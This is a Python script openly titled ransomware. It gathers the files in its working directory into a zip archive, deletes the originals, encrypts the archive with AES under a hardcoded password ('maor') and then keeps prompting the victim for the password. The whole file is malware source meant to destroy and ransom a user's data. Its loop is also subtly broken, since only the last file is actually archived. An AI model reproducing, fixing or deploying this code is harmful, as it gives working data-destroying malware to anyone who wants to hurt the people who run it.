import zipfile
import os
import easygui
import time
import pyAesCrypt
import shutil

global PASSWORD
PASSWORD = 'maor'

def get_files_names():
    return list([directory for directory in os.listdir() if not(directory.startswith('ransomware.py'))])

def compress_zip(file_name, zip_file):
    if not(file_name == 'locked_files.zip'):
        if not(file_name.endswith('.aes')):
            zip_file.write(file_name)
            try:
                os.remove(file_name)
            except:
                shutil.rmtree(file_name, ignore_errors=True)
    else:
        pass
    
def encrypt_zip(zip_file):
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(zip_file, f'{zip_file}.aes', PASSWORD, bufferSize)
    
def decrypt_zip(zip_file, password):
    bufferSize = (64 * 1024)
    pyAesCrypt.decryptFile(f'{zip_file}.aes', f'{zip_file}', password, bufferSize)

def extract_aes():
    user_input = easygui.enterbox("Enter the password for the Ransomware Virus!", title='Ransomware - Maor')
    try:
        decrypt_zip('locked_files.zip', user_input)
        easygui.msgbox('Here you go.....',title = 'Ransomware - Maor')
        os.system('del locked_files.zip.aes')
        exit(0)

    except ValueError:
        easygui.msgbox('Nope!\n Try again!', title= 'Ransomware - Maor')

    except TypeError:
        os.system('del locked_files.zip')
        exit(0)
        
def main():
    file_names = get_files_names()
    for name in file_names:
        if name.endswith('.aes'):
            extract_aes()
        else:
            continue
    zip_file = zipfile.ZipFile('locked_files.zip', 'a', zipfile.ZIP_DEFLATED)
    for name in file_names:
        time.sleep(0.5)
    compress_zip(name, zip_file)
    zip_file.close()
    encrypt_zip('locked_files.zip')
    os.system('del locked_files.zip')
    while True:
        extract_aes()
            

if __name__ == "__main__":
    main()